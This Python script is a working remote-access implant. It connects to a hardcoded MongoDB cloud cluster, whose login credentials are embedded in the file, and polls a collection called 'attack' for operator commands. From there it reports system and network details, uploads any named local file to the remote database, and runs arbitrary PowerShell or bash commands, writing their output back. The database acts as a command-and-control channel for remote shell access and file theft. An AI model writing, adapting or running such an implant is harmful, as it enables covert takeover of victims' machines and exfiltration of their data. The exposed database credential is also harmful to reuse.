import time
import platform
import psutil
import socket
import subprocess
import shlex
import os
import shutil
import gridfs
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi

# --- MongoDB setup ---
uri = "mongodb+srv://papercode:3aOqN02ZVrIvAaO3@web.pxkfwja.mongodb.net/?retryWrites=true&w=majority&appName=web"
client = MongoClient(uri, server_api=ServerApi('1'))

try:
    client.admin.command('ping')
    print("Successfully connected to Panther...")
except Exception as e:
    print("MongoDB connection error:", e)

db = client['attack_db']
collection = db['attack']

# --- helpers for system info ---
def get_basic_info():
    return {
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Python Version": platform.python_version(),
    }

def get_hardware_info():
    mem = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    return {
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
        "RAM (GB)": round(mem.total / 1024**3, 2),
        "Disk Total (GB)": round(disk.total / 1024**3, 2),
        "Disk Free (GB)": round(disk.free / 1024**3, 2),
    }

def get_internet_info():
    hostname = socket.gethostname()
    try:
        ip_address = socket.gethostbyname(hostname)
    except Exception:
        ip_address = "unknown"
    return {
        "Hostname": hostname,
        "IP Address": ip_address,
    }

SECTION_MAP = {
    "basic": get_basic_info,
    "hardware": get_hardware_info,
    "internet": get_internet_info
}

# --- powerhsell / shell selection ---
IS_WINDOWS = platform.system() == "Windows"
# Prefer pwsh (PowerShell Core) if available, otherwise fallback to powershell (Windows PowerShell)
POWERSHELL_CMD = None
if IS_WINDOWS:
    if shutil.which("pwsh"):
        POWERSHELL_CMD = "pwsh"
    elif shutil.which("powershell"):
        POWERSHELL_CMD = "powershell"
    else:
        POWERSHELL_CMD = None
else:
    # On non-windows, fallback to /bin/bash if present
    if shutil.which("bash"):
        POWERSHELL_CMD = "bash"
    else:
        POWERSHELL_CMD = None

def execute_in_powershell(cmd, cwd=None, timeout=15):
    """
    Run the given command string in PowerShell (or bash fallback on non-Windows).
    Returns (stdout+stderr) string.
    """
    if POWERSHELL_CMD is None:
        return "No shell available on this host."

    # On Windows use: pwsh/powershell -NoProfile -Command "<cmd>"
    # On Linux fallback to bash -c "<cmd>"
    try:
        if IS_WINDOWS:
            proc = subprocess.Popen(
                [POWERSHELL_CMD, "-NoProfile", "-Command", cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=cwd
            )
        else:
            # bash -c preserves quoting/pipes etc.
            proc = subprocess.Popen(
                [POWERSHELL_CMD, "-c", cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=cwd
            )

        stdout, stderr = proc.communicate(timeout=timeout)
        output = ""
        if stdout:
            output += stdout
        if stderr:
            # append stderr on a new line
            output += ("\n" + stderr) if output else stderr
        output = output.rstrip()
        if not output:
            return "(No output)"
        return output

    except subprocess.TimeoutExpired:
        try:
            proc.kill()
        except Exception:
            pass
        return "Command timed out."
    except Exception as e:
        return f"Error executing shell command: {e}"

# --- main loop: listen for attacks and respond ---
while True:
    try:
        attacks = collection.find().sort("timestamp", 1)

        for attack in attacks:
            cmd = attack.get('attack', '')

            # -- deer-state handling --
            if cmd == "deer-state-pending":
                collection.delete_one({"_id": attack['_id']})
                collection.insert_one({
                    "attack": "deer-state-ok",
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                })
                continue

            if cmd.startswith("system-info"):
                suffix = cmd[len("system-info"):].lstrip("-")
                parts = [p for p in suffix.split("-") if p] or ["basic"]
                info = {}
                for part in parts:
                    func = SECTION_MAP.get(part)
                    if func:
                        info.update(func())
                if info:
                    info_str = "\n".join(f"{k}: {v}" for k, v in info.items())
                    collection.delete_one({"_id": attack['_id']})
                    collection.insert_one({
                        "attack": f"system-info:\n{info_str}",
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    })
                else:
                    # Unknown or empty sections -> respond with helpful message
                    collection.delete_one({"_id": attack['_id']})
                    collection.insert_one({
                        "attack": "system-info: unknown sections",
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    })
                continue


            if cmd.startswith("upload-"):
                collection.delete_one({"_id": attack['_id']})
                fs = gridfs.GridFS(db)
                filename = cmd[len("upload-"):].strip()
                if not filename or not os.path.isfile(filename):
                    collection.insert_one({
                        "attack": f"upload: file not found: {filename}",
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    })
                    print("File not found:", filename)
                    continue
                try:
                    with open(filename, "rb") as f:
                        file_id = fs.put(f, filename=os.path.basename(filename))
                    
                    collection.insert_one({
                        "attack": f"upload: uploaded {filename} with id {file_id}",
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    })
                    print(f"Uploaded {filename} with id {file_id}")
                except Exception as e:
                    collection.insert_one({
                        "attack": f"upload: error uploading {filename}: {e}",
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    })
                    print(f"Error uploading {filename}: {e}")


            if cmd.startswith("shell-"):
                shell_cmd = cmd[len("shell-"):].strip()
                print(f"Executing shell command: {shell_cmd}")

                output = None

                if shell_cmd.startswith("cd "):
                    path = shell_cmd[3:].strip().strip('"').strip("'")
                    try:
                        os.chdir(path)
                        output = f"Changed directory to {os.getcwd()}"
                    except Exception as e:
                        output = f"cd error: {e}"
                elif shell_cmd == "scan":
                    try:
                        items = os.listdir(os.getcwd())
                        if items:
                            output = "\n".join(items)
                        else:
                            output = "(empty directory)"
                    except Exception as e:
                        output = f"scan error: {e}"

                elif shell_cmd.startswith("search"):
                    parts = shlex.split(shell_cmd)
                    if len(parts) < 2:
                        output = "search error: missing search term"
                    else:
                        term = parts[1]
                        max_depth = 3
                        if len(parts) >= 3:
                            try:
                                max_depth = int(parts[2])
                            except ValueError:
                                output = "search error: invalid max depth"
                                max_depth = None
                        if max_depth is not None:
                            matches = []
                            for root, dirs, files in os.walk(os.getcwd()):
                                depth = root[len(os.getcwd()):].count(os.sep)
                                if depth > max_depth:
                                    dirs[:] = []  # don't recurse deeper
                                    continue
                                for name in files + dirs:
                                    if term.lower() in name.lower():
                                        full_path = os.path.join(root, name)
                                        matches.append(full_path)
                            if matches:
                                output = "\n".join(matches)
                            else:
                                output = "(no matches found)"
                else:
                    # Run the command in PowerShell (or bash fallback); pass current working dir
                    output = execute_in_powershell(shell_cmd, cwd=os.getcwd(), timeout=30)

                # respond back to collection and remove trigger
                collection.delete_one({"_id": attack['_id']})
                collection.insert_one({
                    "attack": f"shelloutput:\n{output}",
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                })
                continue

    except Exception as e:
        # avoid crashing loop on unexpected errors; log and continue
        print("Listener loop error:", e)
        time.sleep(1)
